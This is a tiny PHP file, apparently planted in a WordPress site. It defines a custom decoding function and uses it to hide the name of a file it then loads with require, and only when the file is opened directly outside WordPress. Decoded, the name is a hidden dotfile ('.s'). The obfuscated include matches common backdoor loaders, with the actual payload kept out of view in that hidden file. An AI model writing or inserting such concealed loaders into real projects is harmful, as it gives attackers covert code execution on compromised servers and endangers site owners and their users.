<?php
function osc($f, $d)
{
    $r = '';
    for ($i = 0; $i < strlen($f); $i += 2) {
        $v = ord($f[$i]) - 65;
        $b = ord($f[$i + 1]);
        if ($b > 90) $b -= 6;
        $s = $v * 52 + ($b - 65);
        $r .= chr($s - $d);
    }
    return $r;
}

if (!defined('ABSPATH')) {
    require osc('RvTM', 885);
}
